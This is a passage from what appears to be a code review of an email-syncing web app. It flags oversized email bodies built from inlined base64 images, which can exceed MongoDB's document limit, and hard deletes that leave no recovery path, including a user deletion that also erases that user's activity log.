- **`Email.body` has no length cap**, and inline images are inlined as base64 data URIs (`gmailController.js:376`), so a single mail with a few large embedded images can produce a multi-megabyte document. MongoDB's 16 MB document limit will eventually reject `emailRecord.save()`, aborting the sync (see finding 27). Cap the body and store attachments/images by reference.
- **No soft-delete on any model.** `deleteUser`, `deleteSingleEmail`, `deleteAllEmails`, `deleteComment`, `deleteKeywordRule`, `deleteClient` are all hard deletes with no recovery path, and `deleteUser` additionally purges the target's `ActivityLog` entries (`userController.js:257`) — destroying the audit trail of the account being destroyed.
